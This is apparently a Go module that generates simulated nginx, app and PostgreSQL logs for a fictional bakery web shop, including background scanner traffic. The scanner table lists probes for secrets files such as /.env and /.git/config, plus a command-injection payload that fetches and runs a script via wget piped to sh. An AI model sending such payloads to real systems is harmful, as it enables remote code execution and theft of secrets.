package machine

import (
	"bytes"
	"fmt"
	"regexp"
	"strings"
	"time"
)

const shopHost = "shop.hazelbakery.example"

var browserUAs = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
}

var crawlerUAs = []string{
	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
	"Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
}

var scannerHits = []struct{ method, path, ua string }{
	{"GET", "/.env", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"},
	{"GET", "/wp-login.php", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0"},
	{"GET", "/phpmyadmin/", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"},
	{"GET", "/.git/config", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"},
	{"GET", "/", "Mozilla/5.0 zgrab/0.x"},
	{"GET", "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F192.0.2.77%2Ft%7Csh%60)", "Go-http-client/1.1"},
	{"POST", "/boaform/admin/formLogin", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"},
	{"GET", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"},
	{"GET", "/actuator/env", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"},
	{"GET", "/favicon.ico", "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"},
}

// webRequest is one request nginx served; the access log, the error log
// and the shop's own log are all views of one stream of them.
type webRequest struct {
	t       time.Time
	ip      string
	method  string
	path    string
	status  int
	bytes   int
	ref     string
	ua      string
	byIP    bool // sent to the bare IP, so the default server answered
	app     bool // proxied to the Node app
	latency int  // ms, for the app log
	order   int  // order id for a paid checkout, else 0
}

// webTraffic calls fn for every request in [from, to), in time order.
// Shoppers come in daytime visits of a few requests each; scanners and
// crawlers arrive around the clock.
func (m *Machine) webTraffic(from, to time.Time, fn func(webRequest)) {
	const slot = 60
	for s := from.Unix() / slot; s*slot < to.Unix(); s++ {
		r := m.rng("web", s)
		start := time.Unix(s*slot, 0).In(from.Location())
		var reqs []webRequest
		h := start.Hour()
		visitP := 0.04
		if h >= 7 && h < 22 {
			visitP = 0.22
		}
		if r.chance(visitP) {
			ip, ua := r.docIP(), r.pick(browserUAs)
			t := start.Add(time.Duration(r.intn(50)) * time.Second)
			page := []string{"/", "/products", "/products/sourdough-loaf", "/products/cinnamon-buns", "/about", "/products/birthday-cake"}[r.intn(6)]
			ref := []string{"-", "https://www.google.com/", "https://www.instagram.com/", "-"}[r.intn(4)]
			reqs = append(reqs,
				webRequest{t: t, ip: ip, method: "GET", path: page, status: 200, bytes: 4200 + r.intn(9000), ref: ref, ua: ua, app: true, latency: 8 + r.intn(40)},
				webRequest{t: t, ip: ip, method: "GET", path: "/static/css/app.css", status: 200, bytes: 18734, ref: "https://" + shopHost + page, ua: ua},
				webRequest{t: t.Add(time.Second), ip: ip, method: "GET", path: "/static/js/app.js", status: 200, bytes: 71520, ref: "https://" + shopHost + page, ua: ua},
				webRequest{t: t.Add(time.Second), ip: ip, method: "GET", path: "/api/products", status: 200, bytes: 6312, ref: "https://" + shopHost + page, ua: ua, app: true, latency: 12 + r.intn(60)},
			)
			if r.chance(0.12) {
				ct := t.Add(time.Duration(40+r.intn(200)) * time.Second)
				order := 4000 + int(s/1440)%5000*3 + r.intn(3)
				reqs = append(reqs,
					webRequest{t: ct, ip: ip, method: "POST", path: "/api/checkout", status: 200, bytes: 91, ref: "https://" + shopHost + "/cart", ua: ua, app: true, latency: 380 + r.intn(900), order: order},
					webRequest{t: ct.Add(2 * time.Second), ip: ip, method: "GET", path: "/order/confirmed", status: 200, bytes: 3911, ref: "https://" + shopHost + "/cart", ua: ua, app: true, latency: 9 + r.intn(20)},
				)
			}
		}
		if r.chance(0.18) {
			sc := scannerHits[r.intn(len(scannerHits))]
			t := start.Add(time.Duration(r.intn(60)) * time.Second)
			req := webRequest{t: t, ip: r.docIP(), method: sc.method, path: sc.path, ref: "-", ua: sc.ua, byIP: r.chance(0.7)}
			switch {
			case req.byIP && req.path == "/":
				req.status, req.bytes = 200, 612
			case req.byIP && req.method == "POST":
				req.status, req.bytes = 405, 166
			case req.byIP:
				req.status, req.bytes = 404, 162
			default:
				req.status, req.bytes, req.app, req.latency = 404, 139, true, 2+r.intn(6)
			}
			reqs = append(reqs, req)
		}
		if r.chance(0.03) {
			t := start.Add(time.Duration(r.intn(60)) * time.Second)
			reqs = append(reqs, webRequest{t: t, ip: r.docIP(), method: "GET", path: "/robots.txt", status: 404, bytes: 139, ref: "-", ua: r.pick(crawlerUAs), app: true, latency: 3})
		}
		for _, q := range reqs {
			if !q.t.Before(from) && q.t.Before(to) {
				fn(q)
			}
		}
	}
}

// nginxAccessLog renders /var/log/nginx/access.log (combined format) and
// error.log up to end; nginx's logs rotate daily.
func (m *Machine) nginxLogs(end time.Time) (access, errors []byte, mtime, errMtime time.Time) {
	from := laterOf(dayStart(end), m.BootTime)
	var a, e eventLog
	n := 0
	m.webTraffic(from, end, func(q webRequest) {
		n++
		a.add(q.t, fmt.Sprintf(`%s - - [%s] "%s %s HTTP/1.1" %d %d "%s" "%s"`,
			q.ip, q.t.Format("02/Jan/2006:15:04:05 -0700"), q.method, q.path, q.status, q.bytes, q.ref, q.ua))
		if q.byIP && q.status == 404 {
			e.add(q.t, fmt.Sprintf(`%s [error] 734#734: *%d open() "/var/www/html%s" failed (2: No such file or directory), client: %s, server: _, request: "%s %s HTTP/1.1", host: "%s"`,
				q.t.Format("2006/01/02 15:04:05"), 18000+n*3, strings.SplitN(q.path, "?", 2)[0], q.ip, q.method, q.path, m.Profile.IPv4))
		}
	})
	// a few slow checkouts a week end in an upstream timeout
	for d := dayStart(end); d.Before(end); d = d.Add(24 * time.Hour) {
		r := m.rng("upstream", d.Unix())
		if r.chance(0.5) {
			t := d.Add(time.Duration(9*3600+r.intn(10*3600)) * time.Second)
			if !t.Before(from) && t.Before(end) {
				e.add(t, fmt.Sprintf(`%s [error] 735#735: *%d upstream timed out (110: Connection timed out) while reading response header from upstream, client: %s, server: %s, request: "POST /api/checkout HTTP/1.1", upstream: "http://127.0.0.1:3000/api/checkout", host: "%s", referrer: "https://%s/cart"`,
					t.Format("2006/01/02 15:04:05"), 20000+r.intn(9000), r.docIP(), shopHost, shopHost, shopHost))
			}
		}
	}
	return a.render(), e.render(), laterOf(a.last(), from), laterOf(e.last(), from)
}

// appLog renders the shop's pino log, /var/log/bakery/app.log, for the
// last three days: the app writes it itself and nothing rotates it often.
func (m *Machine) appLog(end time.Time) ([]byte, time.Time) {
	from := laterOf(dayStart(end).Add(-48*time.Hour), m.BootTime)
	host := m.Profile.Hostname
	var l eventLog
	n := 0
	m.webTraffic(from, end, func(q webRequest) {
		if !q.app {
			return
		}
		n++
		ms := q.t.UnixMilli() + int64(n%997)
		l.add(q.t, fmt.Sprintf(`{"level":30,"time":%d,"pid":912,"hostname":"%s","reqId":"req-%x","req":{"method":"%s","url":"%s"},"res":{"statusCode":%d},"responseTime":%d,"msg":"request completed"}`,
			ms, host, ms%0xfffff, q.method, q.path, q.status, q.latency))
		if q.order > 0 {
			l.add(q.t, fmt.Sprintf(`{"level":30,"time":%d,"pid":912,"hostname":"%s","orderId":%d,"totalCents":%d,"msg":"order paid"}`,
				ms+int64(q.latency), host, q.order, 850+int(ms%61)*50))
		}
	})
	// the odd warning
	for d := dayStart(from); d.Before(end); d = d.Add(24 * time.Hour) {
		r := m.rng("appwarn", d.Unix())
		t := d.Add(time.Duration(r.intn(86400)) * time.Second)
		if !t.Before(from) && t.Before(end) {
			l.add(t, fmt.Sprintf(`{"level":40,"time":%d,"pid":912,"hostname":"%s","msg":"stripe webhook retry: event already processed","eventType":"payment_intent.succeeded"}`, t.UnixMilli(), host))
		}
	}
	return l.render(), laterOf(l.last(), from)
}

// postgresLog renders /var/log/postgresql/postgresql-14-main.log for the
// current week. PostgreSQL 14 logs little by default: the occasional
// client that went away, and the nightly backup's connection when it
// trips over a lock.
func (m *Machine) postgresLog(end time.Time) ([]byte, time.Time) {
	from := laterOf(weekStart(end), m.BootTime)
	var l eventLog
	stamp := func(t time.Time) string { return t.Format("2006-01-02 15:04:05.000 MST") }
	if !m.BootTime.Before(from) {
		b := m.BootTime.Add(9 * time.Second)
		l.add(b, stamp(b)+" [801] LOG:  starting PostgreSQL 14 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, 64-bit")
		l.add(b, stamp(b)+" [801] LOG:  listening on IPv4 address \"127.0.0.1\", port 5432")
		l.add(b, stamp(b)+" [801] LOG:  listening on Unix socket \"/var/run/postgresql/.s.PGSQL.5432\"")
		l.add(b, stamp(b)+" [819] LOG:  database system was shut down at "+stamp(b.Add(-40*time.Second)))
		l.add(b, stamp(b)+" [801] LOG:  database system is ready to accept connections")
	}
	for d := dayStart(from); d.Before(end); d = d.Add(24 * time.Hour) {
		r := m.rng("pg", d.Unix())
		for i := r.intn(4); i > 0; i-- {
			t := d.Add(time.Duration(r.intn(86400))*time.Second + time.Duration(r.intn(1000))*time.Millisecond)
			if t.Before(from) || !t.Before(end) {
				continue
			}
			pid := m.pidAt(t, 4)
			switch r.intn(3) {
			case 0:
				l.add(t, stamp(t)+fmt.Sprintf(" [%d] bakery@bakery LOG:  could not receive data from client: Connection reset by peer", pid))
			case 1:
				l.add(t, stamp(t)+fmt.Sprintf(" [%d] bakery@bakery ERROR:  duplicate key value violates unique constraint \"customers_email_key\"", pid))
				l.add(t, stamp(t)+fmt.Sprintf(" [%d] bakery@bakery DETAIL:  Key (email)=(%s@example.com) already exists.", pid, base64ish(fmt.Sprint(t.Unix()), 8)))
				l.add(t, stamp(t)+fmt.Sprintf(" [%d] bakery@bakery STATEMENT:  INSERT INTO customers (email, name, password_hash) VALUES ($1, $2, $3) RETURNING id", pid))
			default:
				l.add(t, stamp(t)+fmt.Sprintf(" [%d] [unknown]@[unknown] LOG:  incomplete startup packet", pid))
			}
		}
	}
	return l.render(), laterOf(l.last(), from)
}

// stampRE finds the timestamp near the start of a dpkg.log, bootstrap.log or
// alternatives.log line ("update-alternatives 2026-11-10 04:41:49: ...").
var stampRE = regexp.MustCompile(`^(?:update-alternatives )?(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})`)

// rebaseLog shifts the timestamps of a recorded log so that its first one
// falls at start, keeping the gaps between lines.
func rebaseLog(data []byte, start time.Time) []byte {
	const layout = "2006-01-02 15:04:05"
	var out bytes.Buffer
	var shift time.Duration
	first := true
	for _, line := range strings.SplitAfter(string(data), "\n") {
		if loc := stampRE.FindStringSubmatchIndex(line); loc != nil {
			if t, err := time.ParseInLocation(layout, line[loc[2]:loc[3]], time.UTC); err == nil {
				if first {
					wall := time.Date(start.Year(), start.Month(), start.Day(), start.Hour(), start.Minute(), start.Second(), 0, time.UTC)
					shift, first = wall.Sub(t), false
				}
				line = line[:loc[2]] + t.Add(shift).Format(layout) + line[loc[3]:]
			}
		}
		out.WriteString(line)
	}
	return out.Bytes()
}
